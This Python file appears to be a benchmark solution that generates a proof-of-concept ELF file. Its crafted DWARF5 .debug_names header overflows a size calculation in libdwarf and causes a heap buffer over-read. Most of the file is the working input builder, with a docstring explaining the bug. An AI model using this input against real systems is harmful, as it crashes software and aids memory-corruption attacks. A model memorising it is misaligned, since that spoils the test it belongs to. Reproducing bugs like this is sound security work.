import struct

class Solution:
    """
    Generates a PoC for a heap buffer overflow vulnerability in libdwarf.
    """
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC input that triggers the vulnerability.

        The vulnerability is an integer overflow when calculating the size of
        various tables within the DWARF5 .debug_names section. By crafting
        large count values in the header, the sum used to determine the total
        size of these tables (`dn_all_entries_size`) can be made to overflow
        and wrap around to a small value (e.g., 1).

        This leads to a small buffer allocation (`malloc(1)`). However, the
        code then calculates pointers into this buffer using the original,
        large, non-overflowed count values. This results in pointers that
        point far beyond the bounds of the small allocated buffer.

        When a subsequent operation (like printing the debug names) attempts
        to dereference these out-of-bounds pointers, a heap buffer over-read
        occurs, causing a crash, which is detected by sanitizers like ASAN.

        The PoC is a minimal 64-bit ELF file containing a specially crafted
        .debug_names section.
        """
        
        # .debug_names section content that triggers the integer overflow.
        # The sum of (cu_count*4), (bucket_count*4), (name_count*4), and
        # abbrev_table_size overflows a 32-bit unsigned integer, resulting
        # in a total calculated size of 1.
        poc_data = b''
        poc_data += struct.pack('<I', 34)              # unit_length
        poc_data += struct.pack('<H', 5)               # version
        poc_data += struct.pack('<H', 0)               # padding
        poc_data += struct.pack('<I', 0x10000000)      # cu_count
        poc_data += struct.pack('<I', 0)               # local_tu_count
        poc_data += struct.pack('<I', 0)               # foreign_tu_count
        poc_data += struct.pack('<I', 0x10000000)      # bucket_count
        poc_data += struct.pack('<I', 0x10000000)      # name_count
        poc_data += struct.pack('<I', 0x40000001)      # abbrev_table_size
        poc_data += struct.pack('<I', 1)               # augmentation_string_size
        poc_data += b'\x00'                            # augmentation_string
        poc_data += b'\x00'                            # Data payload (1 byte)

        # ELF file structure
        shstrtab_content = b'\x00.shstrtab\x00.debug_names\x00'
        shstrtab_name_offset = 1
        debugnames_name_offset = shstrtab_name_offset + len('.shstrtab') + 1

        elf_header_size = 64
        sheader_entry_size = 64
        sheader_num = 3
        sheader_table_size = sheader_entry_size * sheader_num

        sheader_table_offset = elf_header_size
        shstrtab_offset = sheader_table_offset + sheader_table_size
        debugnames_offset = shstrtab_offset + len(shstrtab_content)

        # ELF64 Header
        elf_header = b''
        elf_header += b'\x7fELF\x02\x01\x01\x00' + b'\x00' * 8
        elf_header += struct.pack('<HH', 1, 62)        # e_type: ET_REL, e_machine: EM_X86_64
        elf_header += struct.pack('<I', 1)             # e_version
        elf_header += struct.pack('<QQQ', 0, 0, sheader_table_offset) # e_entry, e_phoff, e_shoff
        elf_header += struct.pack('<IHHHH', 0, elf_header_size, 0, 0) # e_flags, e_ehsize, e_phentsize, e_phnum
        elf_header += struct.pack('<HHH', sheader_entry_size, sheader_num, 1) # e_shentsize, e_shnum, e_shstrndx

        # Section Header Table
        sheader_table = b''
        # NULL Section Header
        sheader_table += b'\x00' * sheader_entry_size
        
        # .shstrtab Section Header
        sheader_table += struct.pack(
            '<IIQQQQIIQQ',
            shstrtab_name_offset,      # sh_name
            3,                         # sh_type (SHT_STRTAB)
            0,                         # sh_flags
            0,                         # sh_addr
            shstrtab_offset,           # sh_offset
            len(shstrtab_content),     # sh_size
            0,                         # sh_link
            0,                         # sh_info
            1,                         # sh_addralign
            0                          # sh_entsize
        )
        
        # .debug_names Section Header
        sheader_table += struct.pack(
            '<IIQQQQIIQQ',
            debugnames_name_offset,    # sh_name
            1,                         # sh_type (SHT_PROGBITS)
            0,                         # sh_flags
            0,                         # sh_addr
            debugnames_offset,         # sh_offset
            len(poc_data),             # sh_size
            0,                         # sh_link
            0,                         # sh_info
            1,                         # sh_addralign
            0                          # sh_entsize
        )

        return elf_header + sheader_table + shstrtab_content + poc_data